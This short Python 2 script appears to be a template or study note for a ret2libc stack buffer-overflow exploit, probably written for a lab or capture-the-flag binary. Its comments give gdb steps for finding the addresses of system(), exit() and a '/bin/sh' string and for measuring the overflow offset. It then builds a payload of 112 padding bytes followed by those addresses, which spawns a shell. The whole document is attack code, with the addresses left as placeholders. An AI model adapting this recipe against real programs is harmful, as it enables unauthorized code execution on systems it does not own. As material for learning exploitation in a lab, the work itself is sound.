import struct
#gdb -> b main -> r -> p system
system = struct.pack("<I", system_addr)

#gdb -> b main -> r -> p exit
exit = struct.pack("<I", exit_addr)

#/bin/sh
#int main()
#{
#   system("/bin/sh");
#   return 0;
#}
#
#compile the code above
#gdb -> b main -> r -> searchmem /bin/sh
shell=struct.pack("<I", shell_addr)

# find exploit point:
  # pattern_create
  # debug with the generated pattern
  # pattern_offset with the address
buf = 'A' * 112
buf += system
buf += exit
buf += shell

print buf
